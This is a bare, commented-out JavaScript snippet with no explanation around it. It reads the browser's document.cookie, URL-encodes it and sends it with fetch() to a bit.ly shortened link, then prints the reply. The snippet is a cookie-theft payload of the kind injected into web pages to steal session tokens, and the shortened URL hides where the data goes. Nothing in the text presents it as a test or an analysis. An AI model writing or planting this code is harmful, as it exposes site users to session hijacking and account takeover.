#
#let baseUrl = "https://bit.ly/3Hkv2yj";
#let queryParams = "?cookie=" + encodeURIComponent(document.cookie);
#let fullUrl = baseUrl + queryParams;
#
#let headersList = {
#  "Accept": "*/*"
#}
#
#let response = await fetch(fullUrl, {
#  method: "GET",
#  headers: headersList
#});
#
#let data = await response.text();
#console.log(data);
#################
